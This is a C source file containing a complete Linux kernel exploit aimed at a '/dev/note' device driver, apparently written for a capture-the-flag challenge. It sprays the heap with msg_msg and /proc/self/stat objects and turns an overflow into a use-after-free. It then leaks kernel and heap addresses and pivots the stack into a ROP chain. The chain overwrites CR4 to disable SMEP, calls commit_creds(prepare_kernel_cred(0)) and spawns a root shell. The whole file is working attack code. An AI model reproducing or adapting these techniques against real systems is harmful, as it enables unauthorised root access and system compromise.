#define _GNU_SOURCE
#include<sched.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/mman.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/wait.h>
#include<pthread.h>
#include<sys/syscall.h>
#include<sys/ioctl.h>
#include<linux/userfaultfd.h>
#include <poll.h>
#include <signal.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include<sys/socket.h>

#define DEVICE_FILE "/dev/note"
#define SPRAY 0x100
#define DESIRED_CR4_VALUE 0x6f0
#define KERNEL_LEAK_OFFSET 0x60160
#define ALLOC 0xC12ED001
#define DELETE 0xC12ED002
#define FILL 0xC12ED003
#define LEAK 0xC12ED004
typedef unsigned long __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(*prepare_kernel_cred_func)(unsigned long cred);
commit_creds_func commit_creds = (commit_creds_func) 0x69c10;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) 0x69e00;
int fd,qid;
unsigned long kernel_leak;
unsigned long kernel_base;
unsigned long heap128_leak;
unsigned long poprdi=0x11c353;
unsigned long swapgs=0x3ef24;
unsigned long iretq=0x040815;
unsigned long native_write_cr4=0x3ee80;
unsigned long pivot=0x02ce8f;//xchg esp, eax
unsigned long stackpivot;
unsigned long stackbase;
struct args{
	unsigned long size;
	char *buf;
};
struct msg{
  long mtype;
  char mtext[0x80];
};
struct msg msgbuf;

void alloc(unsigned long size){
	struct args arg={.size=size,.buf=NULL};
	ioctl(fd,ALLOC,(char *)&arg);
}

void delete(){
	struct args arg={.size=0,.buf=NULL};
	ioctl(fd,DELETE,(char *)&arg);
}

void fill(unsigned long size,char *buf){
	struct args arg={.size=size,.buf=buf};
	ioctl(fd,FILL,(char *)&arg);
}

void leaks(unsigned long size,char *buf){
	struct args arg={.size=size,.buf=buf};
	ioctl(fd,LEAK,(char *)&arg);
}

void set_affinity(int which_cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(which_cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        perror("sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
}
void privesc(){
	commit_creds(prepare_kernel_cred(0));
}
unsigned long user_cs,user_ss,user_rflags,user_rsp;
static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :
        : "memory");
}
void getshell(){
	if(!getuid()){
		puts("[+] Priv esc successful!");
	}
	puts("[+] Shell1!!!!");
	char *args[]={"/bin/sh",NULL}; 
	execve("/bin/sh",args,NULL);
}

void setup_heapspray_128(){
  	if((qid=msgget(IPC_PRIVATE,0666|IPC_CREAT))==-1){
    		perror("msgget");
    		exit(EXIT_FAILURE);
  	}
  	msgbuf.mtype=1;
  	memset(msgbuf.mtext,'A',sizeof(msgbuf.mtext));
}
void heapspray_128(int n){
  	for(int i=0;i<n;i++){
    		if (msgsnd(qid,&msgbuf,sizeof(msgbuf.mtext)-0x30,0)==-1){
      		perror("msgsnd");
      		exit(EXIT_FAILURE);
    		}
  	}
}
int heapspray_32(int n){
	int ffd;
  	for(int i=0;i<n;i++){
    		if ((ffd=open("/proc/self/stat",O_RDONLY))==-1){
      		perror("stat file open");
      		exit(EXIT_FAILURE);
    		}
  	}
	return ffd;
}
void groom_heap128(int n){
	char buf[0x80]={'A'};
	heapspray_128(n);
	puts("[+] Heap grommed to continuous chunnks!");
	alloc(0x80);	
	puts("[+] Allocated target chunk!");
	fill(0x80,buf);
	puts("[+] Triggered overflow to get double free!");
	delete();
	puts("[+] Emptied buf!");
	heapspray_128(1);
	puts("[+] reached overflowing chunks!");
	alloc(0x80);
	puts("[+] Allocated 1st overlapping chunk to note");
}
void get_kernel_leak(){
	unsigned long ileaks[0x80/8];
	puts("[*] Kernel leak attempt!");
	groom_heap128(0x21);
	socket(22,AF_INET,0);	
	puts("[+] Allocated 2nd overlapping chunk to kernel ds");
	leaks(0x80,(char *)ileaks);
	kernel_leak=ileaks[3];
	kernel_base=kernel_leak-KERNEL_LEAK_OFFSET;
	printf("[+] kernel_leak=%p\n",(void *)kernel_leak);
	printf("[+] kernel_base=%p\n",(void *)kernel_base);
	poprdi+=kernel_base;
	swapgs+=kernel_base;
	iretq+=kernel_base;
	native_write_cr4+=kernel_base;
	pivot+=kernel_base;
	stackpivot=pivot%0x100000000;
	stackbase=(stackpivot>>12)<<12;
	printf("[+] kernel_pivot=%p\n",(void *)pivot);
	printf("[+] stack_pivot=%p\n",(void *)stackpivot);
	printf("[+] stack_base=%p\n",(void *)stackbase);
	commit_creds=(commit_creds_func)(kernel_base+(unsigned long)commit_creds);
	prepare_kernel_cred=(prepare_kernel_cred_func)(kernel_base+(unsigned long)prepare_kernel_cred);
	delete();
}
void get_heap128_leak(){
	puts("[*] Heap leak attempt!");
	groom_heap128(1);
	heapspray_128(1);
	puts("[+] Allocated 2nd overlapping chunk to kernel ds");
	unsigned long ileaks[0x80/8];
	leaks(0x80,(char *)ileaks);
	heap128_leak=ileaks[0];
	printf("heap128_leak=%p\n",(void *)heap128_leak);
	delete();
}

void get_rip_control(){
	set_affinity(0);	
	save_state();
	puts("[*]Rip control attempt!");
	mmap((void *)stackbase,0x6000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,0,0);
	memset((void *)stackbase,0,0x6000);
	unsigned long ropchain[]={poprdi,DESIRED_CR4_VALUE,native_write_cr4,
		privesc,
		swapgs,0xdeadbeef,
		iretq,getshell,user_cs,user_rflags,stackbase+0x4000,user_ss};
	memcpy((void *)stackpivot,ropchain,sizeof(ropchain));
	char buf[0x20];
	for(int i=0;i<0x20;i++){
		buf[i]='A';
	}
	puts("[+] Groom heap!");
	heapspray_32(6);
	puts("[+] allocate target kernel ds");
	int ffd=heapspray_32(1);
	alloc(0x20);
	puts("[+] Trigger overflow to get uaf");
	fill(0x20,buf);
	delete();	
	close(ffd);
	alloc(0x20);
	puts("[+] Reach target chunk!");
	heapspray_32(2);
	fill(0x8,(char *)&heap128_leak);
	puts("[+] Allocate chunk over kernel ds!");
	ffd=heapspray_32(1);
	unsigned long pivots[4]={pivot,pivot,pivot,pivot};
	fill(0x20,(char *)pivots);
	read(ffd,NULL,0);
}

void exploit(){
	setup_heapspray_128();
	get_kernel_leak();
	for(int i=0;i<4;i++){puts("");}
	get_heap128_leak();
	for(int i=0;i<4;i++){puts("");}
	get_rip_control();
}
int main(){
	fd=open(DEVICE_FILE,O_RDWR);
	exploit();
	close(fd);
}
